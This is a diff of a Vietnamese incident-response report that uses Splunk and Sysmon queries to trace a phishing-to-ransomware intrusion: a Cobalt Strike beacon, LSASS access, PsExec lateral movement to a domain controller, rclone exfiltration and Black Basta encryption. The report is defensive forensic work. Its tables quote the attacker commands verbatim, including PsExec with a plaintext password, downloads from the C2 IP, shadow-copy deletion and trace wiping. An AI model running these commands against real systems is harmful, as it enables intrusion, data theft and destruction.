@@ -394,6 +422,7 @@ PsExec là một công cụ dòng lệnh nhẹ thuộc bộ sysinternals, không
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:23:00" process_id=6320 EventCode IN (17, 18)
 | table _time EventDescription PipeName
 ```
+
 ![alt text](images/image-19.png)
 Vào 2025-03-21 15:23:21 và 2025-03-21 15:23:22, process Pancake.jpg.exe (PID =6320) lần lượt tạo và kết nối tới pipe MSSE-5028-server, sau đó, vào 2025-03-21 16:04:21, khoảng 30 phút sau, kết nối tới pipe postex_2198. Trong đó, pipe dạng postex_#### thường được các cobalt strike beacon sử dụng cho các hoạt động post-exploitation. Trong hoạt động này, beacon cha sẽ spawn ra các beacon con (thường dưới dạng 1 process rundll32.exe bị chèn code), 2 beacon sẽ giao tiếp/trao đổi dữ liệu thông qua 1 named pipe. Ta sẽ check xem process nào tạo pipe postex này:
 
@@ -401,6 +430,7 @@ Vào 2025-03-21 15:23:21 và 2025-03-21 15:23:22, process Pancake.jpg.exe (PID =
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:23:00" EventCode IN (17, 18) "postex_2198"
 | table _time Image process_id EventDescription PipeName
 ```
+
 ![alt text](images/image-20.png)
 Ngay vào 2025-03-21 16:04:20, ghi nhận process rundll32.exe (2676) mà được spawn ra bởi chính process Pancake.jpg.exe (PID = 6320) này đã tạo pipe postex_2198 để giao tiếp với process cha. Hành vi này phù hợp với giả thuyết rằng Pancake.jpg.exe là beacon cha sinh ra các beacon con, inject job hậu khai thác vào và đọc kết quả qua named pipe.
 
@@ -408,29 +438,31 @@ Ngay vào 2025-03-21 16:04:20, ghi nhận process rundll32.exe (2676) mà đư�
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:23:00" SourceProcessId=6320 EventCode=10
 | table _time GrantedAccess TargetImage CallTrace
 ```
+
 ![alt text](images/image-21.png)
-Vào 2025-03-21 16:04:20, ghi nhận process Pancake.jpg.exe (PID = 6320) nhận handle với access mask `0x1fffff` (PROCESS_ALL_ACCESS) tới các process `cmd.exe` và `rundll32.exe` mà nó sinh ra, đây chỉ là handle trả về từ việc gọi winapi `CreateProcess`. `CallTrace` bắt đầu từ vùng nhớ `UNKNOWN` cho thấy dấu hiệu code được chạy trong private memory không map tới bất kì module nào. Ngoài ra, trong log sysmon không ghi nhận event id 8 – CreateRemoteThread nào để xác nhận việc inject code.
+Vào 2025-03-21 16:04:20, ghi nhận process Pancake.jpg.exe (PID = 6320) nhận handle với access mask 0x1fffff (PROCESS_ALL_ACCESS) tới các process cmd.exe và rundll32.exe mà nó sinh ra, đây chỉ là handle trả về từ việc gọi winapi CreateProcess. CallTrace bắt đầu từ vùng nhớ UNKNOWN cho thấy dấu hiệu code được chạy trong private memory không map tới bất kì module nào. Ngoài ra, trong log sysmon không ghi nhận event id 8 – CreateRemoteThread nào để xác nhận việc inject code.
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:23:00" parent_process_id=6320 EventCode=1
 | table _time process_id CommandLine CurrentDirectory
 ```
+
 Spawn ra các process:
 | Giờ | PID | Lệnh | Giải thích |
 |---|---|---|---|
-| 15:26:22 | 8296 | `bitsadmin /transfer "d" https://www.softperfect.com/download/files/netscan_portable.zip Netscan.zip` | Lạm dụng bitsadmin (LOLBIN) tải công cụ Netscan vào thư mục làm việc hiện tại |
-| 15:27:28 | 11572 | `bitsadmin /transfer "d" https://www.softperfect.com/download/files/netscan_portable.zip %%LOCALAPPDATA%%\Temp\Netscan.zip` | Thử tải lại, chỉ rõ output path là %LOCALAPPDATA%\Temp\Netscan.zip  |
-| 15:31:39 | 5792 | `cmd /C dir` | Liệt kê các items trong thư mục hiện tại nhằm kiểm tra xem đã tải thành công chưa  |
+| 15:26:22 | 8296 | bitsadmin /transfer "d" https://www.softperfect.com/download/files/netscan_portable.zip Netscan.zip | Lạm dụng bitsadmin (LOLBIN) tải công cụ Netscan vào thư mục làm việc hiện tại |
+| 15:27:28 | 11572 | bitsadmin /transfer "d" https://www.softperfect.com/download/files/netscan_portable.zip %%LOCALAPPDATA%%\Temp\Netscan.zip | Thử tải lại, chỉ rõ output path là %LOCALAPPDATA%\Temp\Netscan.zip  |
+| 15:31:39 | 5792 | cmd /C dir | Liệt kê các items trong thư mục hiện tại nhằm kiểm tra xem đã tải thành công chưa  |
 | 15:37:39 | 6000 | bitsadmin /transfer "d" http://www.softperfect.com/download/files/netscan_portable.zip %%LOCALAPPDATA%%\Temp\Netscan.zip | Thử tải lại nhưng đổi sang giao thức HTTP |
-| 15:42:49 | 10856 | `powershell Expand-Archive -LiteralPath '%LOCALAPPDATA%\Temp\Netscan.zip' -DestinationPath %LOCALAPPDATA%\Temp\` | Spawn ra 1 instance powershell giải nén Netscan.zip |
-| 15:43:59 | 8600 | `%LOCALAPPDATA%\Temp\64-bit\netscan.exe /hide /range:10.10.11.1-10.10.255.255 /auto:results.xml` | Dùng công cụ netscan.exe scan ip trong khoảng 10.10.11.1-10.10.255.255 rồi ghi output ra tệp results.xml |
-| 15:59:09 | 2096 | `bitsadmin /transfer "d" https://raw.githubusercontent.com/davehardy20/sysinternals/refs/heads/master/PsExec64.exe C:\Users\knixon\AppData\Local\Temp\PsExec64.exe` | Tải PsExec64.exe và đặt trong Temp (event code 11 trước đó đã xác nhận tệp tải thành công) |
-| 16:02:20 | 10856 | `cmd /C dir` | Kiểm tra xem đã tải thành công chưa |
-| 16:04:20 | 2676 | `C:\Windows\system32\rundll32.exe` | Spawn ra beacon con |
-| 16:06:21 | 10236 | `PsExec64.exe /accepteula \\10.10.11.170 -u financees.local\swhite -p "b<ZITx4h1" whoami` | Sử dụng PsExec thực thi lệnh whoami trên host DC01 (10.10.11.170), xác thực với credentials của user swhite |
-| 16:08:31 | 10156 | `cmd.exe /C PsExec64.exe /accepteula \\10.10.11.170 -u financees.local\swhite -p "b&lt;ZITx4h1" hostname`| Thực thi lệnh `hostname` trên DC01 |
-| 16:10:41 | 11688 | `PsExec64.exe \\financees.local -accepteula -s -c -f Pancake.jpg.exe` | Copy Pancake.jpg.exe sang $ADMIN (-c) và chạy binary này trên DC01 dưới tài khoản SYSTEM (-s). Do không cung cấp credentials nên psexec sẽ sử dụng credential của user đang chạy lệnh. Lệnh chỉ thành công nếu tài khoản đó có quyền admin trên máy đích. |
-| 16:52:52 | 2332 | `powershell Remove-Item -Path "$env:LOCALAPPDATA\Temp\*" -Recurse -Force` | Xóa toàn bộ items trong Temp nhằm xóa dấu vết |
+| 15:42:49 | 10856 | powershell Expand-Archive -LiteralPath '%LOCALAPPDATA%\Temp\Netscan.zip' -DestinationPath %LOCALAPPDATA%\Temp\ | Spawn ra 1 instance powershell giải nén Netscan.zip |
+| 15:43:59 | 8600 | %LOCALAPPDATA%\Temp\64-bit\netscan.exe /hide /range:10.10.11.1-10.10.255.255 /auto:results.xml | Dùng công cụ netscan.exe scan ip trong khoảng 10.10.11.1-10.10.255.255 rồi ghi output ra tệp results.xml |
+| 15:59:09 | 2096 | bitsadmin /transfer "d" https://raw.githubusercontent.com/davehardy20/sysinternals/refs/heads/master/PsExec64.exe C:\Users\knixon\AppData\Local\Temp\PsExec64.exe | Tải PsExec64.exe và đặt trong Temp (event code 11 trước đó đã xác nhận tệp tải thành công) |
+| 16:02:20 | 10856 | cmd /C dir | Kiểm tra xem đã tải thành công chưa |
+| 16:04:20 | 2676 | C:\Windows\system32\rundll32.exe | Spawn ra beacon con |
+| 16:06:21 | 10236 | PsExec64.exe /accepteula \\10.10.11.170 -u financees.local\swhite -p "b<ZITx4h1" whoami | Sử dụng PsExec thực thi lệnh whoami trên host DC01 (10.10.11.170), xác thực với credentials của user swhite |
+| 16:08:31 | 10156 | cmd.exe /C PsExec64.exe /accepteula \\10.10.11.170 -u financees.local\swhite -p "b&lt;ZITx4h1" hostname| Thực thi lệnh hostname trên DC01 |
+| 16:10:41 | 11688 | PsExec64.exe \\financees.local -accepteula -s -c -f Pancake.jpg.exe | Copy Pancake.jpg.exe sang $ADMIN (-c) và chạy binary này trên DC01 dưới tài khoản SYSTEM (-s). Do không cung cấp credentials nên psexec sẽ sử dụng credential của user đang chạy lệnh. Lệnh chỉ thành công nếu tài khoản đó có quyền admin trên máy đích. |
+| 16:52:52 | 2332 | powershell Remove-Item -Path "$env:LOCALAPPDATA\Temp\*" -Recurse -Force | Xóa toàn bộ items trong Temp nhằm xóa dấu vết |
 
 
 ```spl
@@ -438,6 +470,7 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1
 | table _time TargetFilename
 | sort _time
 ```
+
 ![alt text](images/image-22.png)
 
 Event code 11 xác nhận các công cụ trên đã được tải về thành công, dựa vào timestamp ta thấy chỉ khi sử dụng giao thức HTTP thì attacker mới thành công tải về netscan
@@ -447,6 +480,7 @@ index=main host=WS1 earliest="03/21/2025:15:43:59" latest="03/21/2025:15:46:00" 
 | table _time Application ProcessID Protocol direction SourceAddress SourcePort DestAddress DestPort  
 | sort _time
 ```
+
 ![alt text](./images/netscan.png)
 Event id 5156 (The Windows Filtering Platform has permitted a connection) ghi nhận một lượng lớn kết nối outbound tới các IP trong khoảng IP quan sát thấy trong câu lệnh netscan trên với protocol được sử dụng là 1 (ICMP). Điều này cho thấy netscan đang thực hiện ICMP Ping Sweep nhằm discover các host nội bộ.    
 
@@ -455,12 +489,14 @@ Event id 5156 (The Windows Filtering Platform has permitted a connection) ghi nh
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:16:04:00" process_id=2676 OR SourceProcessId=2676 OR parent_process_id=2676
 | stats count by EventCode
 ```
+
 Thống kê các event sysmon liên quan đến process này
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:16:04:00" SourceProcessId=2676 EventCode=10
 | table _time GrantedAccess TargetImage CallTrace
 ```
+
 ![alt text](images/image-23.png)
 
 Vào 2025-03-21 16:04:21, process rundll32.exe (PID = 2676) mở handle truy cập vào process lsass.exe với access mask = 0x1010 (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION) và calltrace bắt đầu từ unknown cho thấy dấu hiệu shellcode/reflective code chạy trong process này. Kết hợp với hành vi quan sát được bao gồm: tạo pipe postex giao tiếp với process Pancake.jpg.exe và process Pancake.jpg.exe sử dụng tài khoản của user swhite với password plaintext, rất có thể đây là bước thực hiện credential dumping.
@@ -473,6 +509,7 @@ Tuy nhiên, khoảng thời gian giữa việc ghi nhận sự kiện này và l
 index=main source="XmlWinEventLog:Security" host=WS1 earliest="03/21/2025:16:06:00" EventCode=4648
 | table _time SubjectUserName SubjectLogonId Target_User_Name TargetServerName IpAddress IpPort
 ```
+
 ![alt text](images/image-24.png)
 
 Trên WS1, ghi nhận 2 event 4648 xác thực sử dụng explicit credentials (credential khác với credential chính hiện tại) tương ứng với 2 lệnh psexec thực thi whoami và hostname trên DC01
@@ -484,11 +521,12 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=DC0
 | table _time user IntegrityLevel LogonId parent_process_id parent_process_path process_id CommandLine
 | sort _time
 ```
+
 ![alt text](images/image-25.png)
 
 Process tree:
+
 ```
-		
                                                   [6068] C:\Windows\PSEXESVC.exe
 2025-03-21 16:06:43  swhite   Medium  0x141b52d   └── [6712] "whoami"
 
@@ -561,6 +599,7 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" earliest
 | table _time EventCode process_id User Image TargetFilename QueryName DestinationIp DestinationPort
 | sort _time
 ```
+
 ![alt text](images/image-28.png)
 Chỉ ghi nhận 2 process rclone (1660 và 4556) chạy dưới user swhite mới thành công phân giải dns domain của mega và kết nối với IP tương ứng 
 
@@ -580,6 +619,7 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=DC0
 | table _time TargetFilename Hashes
 ```
 
+
 ![alt text](images/image-30.png)
 
 Hash của 6as98v.exe:
@@ -594,14 +634,17 @@ Kết quả từ virustotal cho thấy đây là 1 ransomware black basta
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=DC01 earliest="03/21/2025:16:49:19" process_id=5792 EventCode=5
 | table _time process_path process_id
 ```
+
 ![alt text](images/image-32.png)
 Ransomware kết thúc vào 2025-03-21 16:52:14, khoảng gần 3 phút sau khi thực thi
 
 ![alt text](images/image-33.png)
 Ransomware spawn ra 2 process xóa volume shadow copy nhằm cản trở quá trình khôi phục dữ liệu:
+
+```
 2025-03-21 16:49:19: cmd.exe /c C:\Windows\SysNative\vssadmin.exe delete shadows /all /quiet
 2025-03-21 16:49:20: cmd.exe /c C:\Windows\System32\vssadmin.exe delete shadows /all /quiet
-
+```
 
 ![alt text](images/image-34.png)
 Vào 2025-03-21 16:49:34, attacker khởi chạy taskmgr.exe với quyền quản trị trong phiên RDP trên DC01. Mục đích có thể là để kiểm tra hoạt động của ransomware.
@@ -613,6 +656,7 @@ Vào 2025-03-21 16:53:30, gửi lệnh “powershell  Remove-Item -Path "C:\User
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=DC01 earliest="03/21/2025:16:49:19" EventCode=11
 | table _time TargetFilename
 ```
+
 ![alt text](images/image-40.png)
 
 Ransomware copy ransom note ra nhiều thư mục khác nhau trong hệ thống
@@ -637,6 +681,7 @@ Your company id for log in: ba7a7058-3531-4b67-bae6-d602e9110361
 index=main "998022B70D83C6DE68E5BDF94E0F8D71" OR "7883F01096DB9BCF090C2317749B6873036C27BA92451B212B8645770E1F0B8A" OR 6as98v.exe
 | stats count by host
 ```
+
 ![alt text](images/image-36.png)
 Chỉ ghi nhận hoạt động của ransomware trên DC01. Log process trước đó trên WS1 cũng không cho thấy process ransomware nào.
 #### Phiên RDP của user swhite 
@@ -645,20 +690,23 @@ Chỉ ghi nhận hoạt động của ransomware trên DC01. Log process trướ
 index=main host=DC01 0x107346c OR 0x1073366
 | stats count by EventCode, source
 ```
+
 ![alt text](images/image-37.png)
 
 ```spl
 index=main host=DC01 0x107346c OR 0x1073366 EventCode=4624
 | table _time IpAddress AuthenticationPackageName Logon_Type TargetLogonId TargetLinkedLogonId TargetUserName TargetUserSid
 ```
+
 ![alt text](images/image-38.png)
 
 ```spl
 index=main host=DC01 0x107346c OR 0x1073366 EventCode=4672
 | table _time SubjectUserName SubjectUserSid SubjectLogonId PrivilegeList
 ```
+
 ![alt text](images/image-39.png)
-User swhite đăng nhập RDP (LogonType 10) vào DC01 lúc 14:17:00 (trước thời điểm Initial Access) từ IP 10.10.6.159, event id 4672 cho thấy user swhite được gán các privilege nâng cao, tức user swhite là một người dùng quản trị. Logon ID được cung cấp cho ta biết phiên này được duy trì cho tới khi các hành động đáng ngờ diễn ra trên DC01. 
+User swhite đăng nhập RDP (LogonType 10) vào DC01 lúc 2025-03-21 14:17:00 (trước thời điểm Initial Access) từ IP 10.10.6.159, event id 4672 cho thấy user swhite được gán các privilege nâng cao, tức user swhite là một người dùng quản trị. Logon ID được cung cấp cho ta biết phiên này được duy trì cho tới khi các hành động đáng ngờ diễn ra trên DC01. 
 
 ## Host 3: ITWS (10.10.11.199)
 
@@ -667,61 +715,103 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" earliest
 | table _time user IntegrityLevel LogonId LogonGuid parent_process_id parent_process_path process_id CommandLine
 | sort _time
 ```
+
 ![alt text](images/image-41.png)
 Không ghi nhận process đáng ngờ nào trên ITWS từ khoảng thời gian xảy ra sự cố trở đi
 
 # Timeline
-# MITRE ATT&CK
+| Timestamp | Host | Event |
+|---|---|---|
+| 2025-03-21 15:08:41 | WS1 | user knixon tải về Financial Records.zip từ url http://54.93.105.22/Financial%20Records.zip |
+| 2025-03-21 15:08:48 | WS1 | user knixon khởi chạy WinRar.exe giải nén tệp vừa tải về |
+| 2025-03-21 15:08:52 | WS1 | winrar giải nén ra tệp Financial Records.xlsm |
+| 2025-03-21 15:08:55 | WS1 | user click vào tệp xlsm và excel khởi chạy |
+| 2025-03-21 15:09:32-15:15:29 | WS1 | macro trong tệp xlsm thực thi và thực thi 1 lệnh powershell tải về tệp F6w1S48.vbs, đặt trong thư mục Temp, rồi script vbs được thực thi qua wscript.exe
+| 2025-03-21 15:15:29 | WS1 | wscript.exe drop payload WindowsUpdaterFX.dll trong C:\Users\knixon\AppData\Local\Temp |
+| 2025-03-21 15:15:31 | WS1 | wscript.exe kết nối tới 54.93.105.22:80 |
+| 2025-03-21 15:15:34 | WS1 | wscript.exe khởi chạy regsvr32.exe /s để nạp và thực thi WindowsUpdaterFX.dll |
+| 2025-03-21 15:15:35 | WS1 | regsvr32.exe drop Pancake.jpg.exe trong Temp và OneDriveUpdater[1].exe trong thư mục INetCache |
+| 2025-03-21 15:15:35 | WS1 | regsvr32.exe tạo Run key WindowsUpdater thực thi vbs, tạo schedule task WiindowsUpdate thực thi WindowsUpdaterFX.dll dưới danh tính SYSTEM |
+| 2025-03-21 15:15:35 | WS1 | Thực thi các lệnh Add-MpPreference -ExclusionPath nhằm khiến window defender bỏ qua việc scan các thư mục: %LOCALAPPDATA%/Temp, %APPDATA%/Microsoft và C:\ProgramData\Microsoft\ssh | 
+| 2025-03-21 15:15:39 | WS1 | Pancake.jpg.exe khởi chạy |
+| 2025-03-21 15:15:39 | WS1 | Pancake.jpg.exe tạo và kết nối tới pipe MSSE-8859-server, đồng thời duy trì beacon tới C2 54.93.105.22:80 |
+| 2025-03-21 15:17:41-15:22:46 | WS1 | Pancake.jpg.exe thực thi các lệnh Discovery bao gồm: whoami, ipconfig /all, systeminfo, net group "domain admins" /domain và net localgroup administrators |
+| 2025-03-21 15:23:21 | WS1 | Một instance Pancake.jpg.exe (PID = 10292) nữa được khởi chạy với Integrity level = High |
+| 2025-03-21 15:23:21–15:23:22 | WS1 | Pancake.jpg.exe (PID = 10292) tạo và kết nối pipe MSSE-5028-server. Instance này cũng duy trì kết nối đến C2 54.93.105.22:80 |
+| 2025-03-21 15:26:22–15:43:59 | WS1 | Pancake.jpg.exe (PID = 10292) tải về và sử dụng netscan scan IP nội bộ trong khoảng 10.10.11.1-10.10.255.255 |
+| 2025-03-21 15:59:09-15:59:10 | WS1 | Pancake.jpg.exe (PID = 10292) tải về PsExec64 | 
+| 2025-03-21 16:04:20 | WS1 | 	Pancake.jpg.exe (PID = 10292) spawn ra rundll32.exe (PID 2676) | 
+| 2025-03-21 16:04:21 | WS1 | rundll32.exe (PID 2676) tạo pipe postex_2198 để giao tiếp với Pancake.jpg.exe |
+| 2025-03-21 16:04:21 | WS1 | rundll32.exe (PID 2676) truy cập lsass.exe | 
+| 2025-03-21 16:06:21 | WS1 | chạy PsExec sử dụng thông tin đăng nhập của user swhite, thực thi lệnh whoami trên DC01 (10.10.11.170) |
+| 2025-03-21 16:06:43 | DC01 | PSEXESVC.exe spawn ra whoami dưới tài khoản user swhite, xác nhận lệnh từ xa đã được thực thi trên DC01 |
+| 2025-03-21 16:08:31 | WS1 | tiếp tục dùng PsExec và tài khoản user swhite để yêu cầu chạy lệnh hostname trên DC01 | 
+| 2025-03-21 16:10:41–16:10:42 | WS1 | Chạy lệnh PsExec64.exe \\financees.local -accepteula -s -c -f Pancake.jpg.exe nhằm sao chép payload sang DC01 và thực thi dưới danh tính SYSTEM |
+| 2025-03-21 16:12:04 | DC01 | Ghi nhận Pancake.jpg.exe (PID 4520) chạy dưới danh tính SYSTEM và spawn ra whoami |
+| 2025-03-21 16:35:06-16:37:10 | DC01 | Tải về và drop công cụ rclone vào thư mục Temp |
+| 2025-03-21 16:37:57-16:38:15 | DC01 | Chuyển sang phiên RDP với danh tính user swhite trên DC01, khởi chạy cmd.exe nhập lệnh "rclone config" để cấu hình rclone |
+| 2025-03-21 16:41:15 | DC01 | Chạy 1 lệnh powershell Compress-Archive nhằm nén C:\clients thành data.zip rồi đặt trong thư mục rclone |
+| 2025-03-21 16:42:18 | DC01 | Pancake.jpg.exe (PID 4520) chạy lệnh: "rclone copy data.zip mega:data" exfil dữ liệu |
+| 2025-03-21 16:42:42–16:43:29 | DC01 | Chuyển sang phiên RDP của swhite, chạy lại lệnh "rclone copy data.zip mega:data", sau đó thêm option --verbose | 
+| 2025-03-21 16:45:19 | DC01 | Beacon chạy lệnh: bcdedit.exe  /set safeboot network |
+| 2025-03-21 16:47:19 | DC01 | Dùng curl tải ransomware 6as98v.exe từ url http://54.93.105.22/6as98v.exe |
+| 2025-03-21 16:49:19 | DC01 | Ransomware 6as98v.exe thực thi dưới danh tính SYSTEM |
+| 16:49:19–16:49:20 | DC01 | Ransomware chạy lệnh: "vssadmin.exe delete shadows /all /quiet" xóa volume shadow copies nhằm cản trở khôi phục dữ liệu |
+| 2025-03-21 16:49:34–16:49:45 | DC01 | Khởi chạy Task Manager trong phiên RDP của swhite |
+| 2025-03-21 16:52:14 | DC01 | Ransomware kết thúc thực thi | 
+| 2025-03-21 16:52:52 | WS1 | Beacon chạy lệnh PowerShell Remove-Item -Recurse -Force nhằm xóa toàn bộ dấu vết trong Temp của user knixon |
+| 2025-03-21 16:53:30 | DC01 | Beacon chạy lệnh PowerShell Remove-Item -Recurse -Force nhằm xóa toàn bộ dấu vết trong Temp của user swhite |
+
+# Mitre att&ck
 | Tactic | Technique | Bằng chứng |
 |---|---|---|
-| Initial access | T1566.001 - Phishing: Spearphishing Attachment | Theo mô tả tình huống, một nhân viên tài chính bị lừa tải một tệp ZIP chứa tài liệu; quá trình điều tra cho thấy tệp được tải là `Financial Records.zip` |
-| Execution | T1204.002 - User Execution: Malicious File | User mở tệp `Financial Records.xlsm` trong tệp ZIP |
-| Execution | T1059 - Command and Scripting Interpreter | `F6w1S48.vbs` thực thi qua `wscript.exe` |
-| Execution | T1059.001 - Command and Scripting Interpreter: PowerShell | `powershell` |
-| Execution | T1059.003 - Command and Scripting Interpreter: Windows Command Shell | `cmd.exe` |
-| Execution | T1569.002 - System Services: Service Execution | PsExec tạo service `PSEXESVC.exe` trên DC01 |
-| Persistence | T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Run key `WindowsUpdater` |
-| Persistence | T1053.005 - Scheduled Task/Job: Scheduled Task | Scheduled task `WiindowsUpdate` |
-| Privilege Escalation | T1078.002 - Valid Accounts: Domain Accounts | `knixon`, `swhite` |
-| Stealth | T1027.010 - Obfuscated Files or Information: Command Obfuscation | PowerShell `-EncodedCommand` |
-| Stealth | T1036.004 - Masquerading: Masquerade Task or Service | `WiindowsUpdate`, `WindowsUpdater` |
-| Stealth | T1218.010 - System Binary Proxy Execution: Regsvr32 | `regsvr32.exe /s C:\Users\knixon\AppData\Local\Temp\WindowsUpdaterFX.dll` |
-| Stealth | T1036.007 - Masquerading: Double File Extension | `Pancake.jpg.exe` |
-| Stealth | T1218.011 - System Binary Proxy Execution: Rundll32 | Beacon spawn `rundll32.exe` (binary hợp lệ của Windows) |
-| Stealth | T1070.004 - Indicator Removal: File Deletion | PowerShell `Remove-Item` toàn bộ item trong thư mục Temp trên cả WS1 và DC01 |
-| Defense Impairment | T1688 - Safe Mode Boot | `bcdedit /set safeboot network` |
-| Defense Impairment | T1685 - Disable or Modify Tools | `Add-MpPreference -ExclusionPath` |
-| Credential Access | T1003.001 - OS Credential Dumping: LSASS Memory | Beacon `rundll32.exe` truy cập `lsass.exe` |
-| Discovery | T1033 - System Owner/User Discovery | `whoami` |
-| Discovery | T1016 - System Network Configuration Discovery | `ipconfig /all` |
-| Discovery | T1082 - System Information Discovery | `systeminfo` |
-| Discovery | T1087.001 - Account Discovery: Local Account | `net localgroup administrators` |
-| Discovery | T1087.002 - Account Discovery: Domain Account | `net group "domain admins" /domain` |
-| Discovery | T1018 - Remote System Discovery | `netscan.exe /hide /range:10.10.11.1-10.10.255.255 /auto:results.xml` |
-| Lateral Movement | T1021.001 - Remote Services: Remote Desktop Protocol | Phiên RDP của `swhite` |
-| Lateral Movement | T1570 - Lateral Tool Transfer | Dùng PsExec copy `Pancake.jpg.exe` sang DC01 |
-| Lateral Movement | T1021.002 - Remote Services: SMB/Windows Admin Shares | PsExec drop `PSEXESVC.exe` trong `ADMIN$` |
-| Command and Control | T1071.001 - Application Layer Protocol: Web Protocols | Beacon tới `54.93.105.22:80` |
-| Command and Control | T1105 - Ingress Tool Transfer | Dùng `bitsadmin`, `curl` tải về Netscan, PsExec, rclone và ransomware |
-| Collection | T1560.001 - Archive Collected Data: Archive via Utility | PowerShell `Compress-Archive -Path "C:\clients"` |
-| Exfiltration | T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage | `rclone copy data.zip mega:data` |
-| Impact | T1490 - Inhibit System Recovery | `vssadmin delete shadows /all /quiet` |
+| Initial access | T1566.001 - Phishing: Spearphishing Attachment | Theo mô tả tình huống, một nhân viên tài chính bị lừa tải một tệp ZIP chứa tài liệu; quá trình điều tra cho thấy tệp được tải là Financial Records.zip |
+| Execution | T1204.002 - User Execution: Malicious File | User mở tệp Financial Records.xlsm trong tệp ZIP |
+| Execution | T1059 - Command and Scripting Interpreter | F6w1S48.vbs thực thi qua wscript.exe |
+| Execution | T1059.001 - Command and Scripting Interpreter: PowerShell | powershell |
+| Execution | T1059.003 - Command and Scripting Interpreter: Windows Command Shell | cmd.exe |
+| Execution | T1569.002 - System Services: Service Execution | PsExec tạo service PSEXESVC.exe trên DC01 |
+| Persistence | T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Run key WindowsUpdater |
+| Persistence | T1053.005 - Scheduled Task/Job: Scheduled Task | Scheduled task WiindowsUpdate |
+| Privilege Escalation | T1078.002 - Valid Accounts: Domain Accounts | knixon, swhite |
+| Stealth | T1027.010 - Obfuscated Files or Information: Command Obfuscation | PowerShell -EncodedCommand |
+| Stealth | T1036.004 - Masquerading: Masquerade Task or Service | WiindowsUpdate, WindowsUpdater |
+| Stealth | T1218.010 - System Binary Proxy Execution: Regsvr32 | regsvr32.exe /s C:\Users\knixon\AppData\Local\Temp\WindowsUpdaterFX.dll |
+| Stealth | T1036.007 - Masquerading: Double File Extension | Pancake.jpg.exe |
+| Stealth | T1218.011 - System Binary Proxy Execution: Rundll32 | Beacon spawn rundll32.exe (binary hợp lệ của Windows) |
+| Stealth | T1070.004 - Indicator Removal: File Deletion | PowerShell Remove-Item toàn bộ item trong thư mục Temp trên cả WS1 và DC01 |
+| Defense Impairment | T1688 - Safe Mode Boot | bcdedit /set safeboot network |
+| Defense Impairment | T1685 - Disable or Modify Tools | Add-MpPreference -ExclusionPath |
+| Credential Access | T1003.001 - OS Credential Dumping: LSASS Memory | Beacon rundll32.exe truy cập lsass.exe |
+| Discovery | T1033 - System Owner/User Discovery | whoami |
+| Discovery | T1016 - System Network Configuration Discovery | ipconfig /all |
+| Discovery | T1082 - System Information Discovery | systeminfo |
+| Discovery | T1087.001 - Account Discovery: Local Account | net localgroup administrators |
+| Discovery | T1087.002 - Account Discovery: Domain Account | net group "domain admins" /domain |
+| Discovery | T1018 - Remote System Discovery | netscan.exe /hide /range:10.10.11.1-10.10.255.255 /auto:results.xml |
+| Lateral Movement | T1021.001 - Remote Services: Remote Desktop Protocol | Phiên RDP của swhite |
+| Lateral Movement | T1570 - Lateral Tool Transfer | Dùng PsExec copy Pancake.jpg.exe sang DC01 |
+| Lateral Movement | T1021.002 - Remote Services: SMB/Windows Admin Shares | PsExec drop PSEXESVC.exe trong ADMIN$ |
+| Command and Control | T1071.001 - Application Layer Protocol: Web Protocols | Beacon tới 54.93.105.22:80 |
+| Command and Control | T1105 - Ingress Tool Transfer | Dùng bitsadmin, curl tải về Netscan, PsExec, rclone và ransomware |
+| Collection | T1560.001 - Archive Collected Data: Archive via Utility | PowerShell Compress-Archive -Path "C:\clients" |
+| Exfiltration | T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage | rclone copy data.zip mega:data |
+| Impact | T1490 - Inhibit System Recovery | vssadmin delete shadows /all /quiet |
 | Impact | T1486 - Data Encrypted for Impact | Ransomware Black Basta |
 # IOC
 | Loại | Giá trị |
 |---|---|
-| IP | `54.93.105.22`, `10.10.6.159` |
-| URL | `http://54.93.105.22/Financial%20Records.zip`, `http://54.93.105.22/F6w1S48.vbs`, `http://54.93.105.22/6as98v.exe` |
-| Domain | `softperfect.com`, `downloads.rclone.org`, `*.mega.co.nz` |
-| Pipe | `MSSE-8859-server`, `MSSE-5028-server`, `postex_2198` |
-| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater`, scheduled task `WiindowsUpdate` |
-| `Financial Records.xlsm` | MD5 `1157A1B4C47091B7020143D00B5D2860`, SHA256 `030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15` |
-| `WindowsUpdaterFX.dll` | MD5 `735AB5713DB79516CF350265FA7574E5`, SHA256 `9A02357D3091379C4A9568F6427C45554E48DAA910CF2F7BD871A9CF7F7B2CB4` |
-| `Pancake.jpg.exe` | SHA1 `3AB69BA2901828CB4FE892976F4808DB0E4EF2A1`, MD5 `5C215C4E29C8EC7FE1590517319C6ECA`, SHA256 `0BEF3A121BC1CADD69B27784616D1E112ADE2A82F961272EDDF7F7641A80CE15` |
-| `PsExec64.exe` | SHA256 `AD6B98C01EE849874E4B4502C3D7853196F6044240D3271E4AB3FC6E3C08E9A4` |
